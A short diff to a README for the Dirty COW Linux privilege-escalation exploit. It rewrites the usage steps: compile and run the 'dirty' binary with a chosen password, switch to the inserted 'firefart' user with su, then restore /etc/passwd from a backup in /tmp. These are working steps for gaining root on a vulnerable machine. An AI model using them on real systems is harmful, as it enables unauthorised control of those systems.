@@ -34,11 +34,15 @@ gcc -pthread dirty.c -o dirty -lcrypt
 
 Run exploit binary:
 ```bash
-./dirty
-[enter new password]
+./dirty is_secure
 ```
 
-In another tty connect as firefart with the new password.
+Login as firefart
+```bash
+su firefart
+Password: is_secure
+```
+
 Restore the old passwd file:
 ```
 mv /tmp/passwd.bak /etc/passwd
